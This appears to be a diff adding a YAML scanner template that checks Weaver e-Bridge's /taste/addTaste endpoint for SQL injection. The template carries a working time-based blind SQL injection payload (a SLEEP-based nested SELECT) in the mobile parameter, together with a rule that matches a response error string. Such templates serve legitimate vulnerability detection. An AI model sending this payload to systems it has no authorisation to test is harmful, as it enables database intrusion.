@@ -1,0 +1,17 @@
+id: ecology-ebridge-addtaste-sqli
+
+info:
+  name: 泛微云桥 taste/addTaste SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  tags: ecology,ebridge,sqli
+  created: 2024/01/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX
+    expression: response.status == 200 && response.body.bcontains(b'添加体验账号程序异常')
+expression: r0()
